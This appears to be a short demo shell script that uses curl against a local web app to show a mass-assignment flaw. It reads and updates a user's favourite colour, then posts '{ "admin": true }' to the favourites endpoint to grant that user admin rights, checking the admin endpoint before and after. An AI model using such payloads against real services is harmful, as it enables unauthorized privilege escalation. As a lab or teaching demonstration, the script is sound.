RED='\033[0;31m'
RESET='\033[0m'

display_msg(){
	printf "${RED}${1}${RESET}\n"
}

display_msg "Old favorites:"
set -x;
curl http://127.0.0.1:8080/favorites \
	-X GET \
	--cookie "userId=1" \
	2>/dev/null \
| jq
set +x;

display_msg "Updating favorite color"
set -x;
curl http://127.0.0.1:8080/favorites \
	-X POST \
	-d '{ "favoriteColor": "red" }' \
	-H "Content-Type: application/json" \
	--cookie "userId=1" \
	-w "\n"
set +x;

display_msg "New favorites:"
set -x;
curl http://127.0.0.1:8080/favorites \
	-X GET \
	--cookie "userId=1" \
	2>/dev/null \
| jq
set +x;

display_msg "Mass assignment exploit"
display_msg "Old admin privs:"
set -x;
curl http://127.0.0.1:8080/admin \
	-X GET \
	--cookie "userId=1" \
	-w "\n"
set +x;

display_msg "Updating admin privs"
set -x;
curl http://127.0.0.1:8080/favorites \
	-X POST \
	-d '{ "admin": true }' \
	-H "Content-Type: application/json" \
	--cookie "userId=1" \
	-w "\n"
set +x;

display_msg "New admin privs:"
set -x;
curl http://127.0.0.1:8080/admin \
	-X GET \
	--cookie "userId=1" \
	-w "\n"
set +x;
